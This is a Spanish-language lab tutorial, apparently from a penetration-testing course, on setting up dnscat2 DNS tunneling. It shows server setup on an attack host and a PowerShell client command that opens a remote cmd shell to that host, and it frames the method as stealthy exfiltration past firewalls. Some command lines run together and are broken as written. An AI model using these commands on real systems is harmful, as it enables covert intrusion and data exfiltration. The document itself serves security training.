# DNS Tunneling with Dnscat2

[Dnscat2](https://github.com/iagox86/dnscat2)es una herramienta de túnel que utiliza el protocolo DNS para enviar datos entre dos hosts. Utiliza un encriptado`Command-&-Control` (`C&C`o`C2`) canal y envía datos dentro de los registros TXT dentro del protocolo DNS. Por lo general, cada entorno de dominio de Active Directory en una red corporativa tendrá su propio servidor DNS, lo que resolverá los nombres de host en direcciones IP y enrutará el tráfico a servidores DNS externos que participan en el sistema DNS general. Sin embargo, con DNSCAT2, la resolución de direcciones se solicita desde un servidor externo. Cuando un servidor DNS local intenta resolver una dirección, los datos se exfiltran y se envían a través de la red en lugar de una solicitud DNS legítima. DNSCAT2 puede ser un enfoque extremadamente sigiloso para exfiltrar los datos mientras evade las detecciones de firewall que tiran las conexiones HTTPS y olfatean el tráfico. Para nuestro ejemplo de prueba, podemos usar el servidor DNSCAT2 en nuestro host de ataque y ejecutar el cliente DNSCAT2 en otro host de Windows.

---

# **Configurar y usar dnscat2**

Si DNSCAT2 aún no está configurado en nuestro host de ataque, podemos hacerlo usando los siguientes comandos:

### **Clonación de DNSCAT2 y configuración del servidor**

Túnel DNS con DNSCAT2

```
xnoxos@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.gitcd dnscat2/server/
sudo gem install bundler
sudo bundle install

```

Luego podemos iniciar el servidor DNSCAT2 ejecutando el archivo DNSCAT2.

### **Iniciar el servidor DNSCAT2**

Túnel DNS con DNSCAT2

```
xnoxos@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cacheNew window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

```

Después de ejecutar el servidor, nos proporcionará la clave secreta, que tendremos que proporcionar a nuestro cliente DNSCAT2 en el host de Windows para que pueda autenticar y cifrar los datos que se envían a nuestro servidor DNSCAT2 externo. Podemos usar el cliente con el proyecto DNSCAT2 o usar[DNSCAT2-POWERSHELL](https://github.com/lukebaggett/dnscat2-powershell), un cliente basado en PowerShell compatible con DNSCAT2 que podemos ejecutar desde objetivos de Windows para establecer un túnel con nuestro servidor DNSCAT2. Podemos clonar el proyecto que contiene el archivo del cliente a nuestro host de ataque, luego transferirlo al objetivo.

### **Clonación de DNSCAT2-POWERSHELL al anfitrión de ataque**

Túnel DNS con DNSCAT2

```
xnoxos@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Una vez que el`dnscat2.ps1`El archivo está en el objetivo, podemos importarlo y ejecutar CMD-Lets asociados.

### **Importación de dnscat2.ps1**

Túnel DNS con DNSCAT2

```powershell
PS C:\htb> Import-Module .\dnscat2.ps1

```

Después de importar DNSCAT2.PS1, podemos usarlo para establecer un túnel con el servidor que se ejecuta en nuestro host de ataque. Podemos enviar una sesión de shell CMD a nuestro servidor.

Túnel DNS con DNSCAT2

```powershell
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd

```

Debemos usar el secreto previamente compartido (`-PreSharedSecret`) Generado en el servidor para garantizar que nuestra sesión esté establecida y encriptada. Si todos los pasos se completan con éxito, veremos una sesión establecida con nuestro servidor.

### **Confirmando el establecimiento de la sesión**

Túnel DNS con DNSCAT2

```
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>

```

Podemos enumerar las opciones que tenemos con DNSCAT2 ingresando`?`en el aviso.

### **Listado de opciones DNSCAT2**

Túnel DNS con DNSCAT2

```
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows

```

Podemos usar DNSCAT2 para interactuar con las sesiones y avanzar más en un entorno objetivo en los compromisos. No cubriremos todas las posibilidades con DNSCAT2 en este módulo, pero se recomienda encarecidamente practicar con él y tal vez incluso encontrar formas creativas de usarlo en un compromiso. Interactuemos con nuestra sesión establecida y bajemos en un caparazón.

### **Interactuar con la sesión establecida**

Túnel DNS con DNSCAT2

```
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```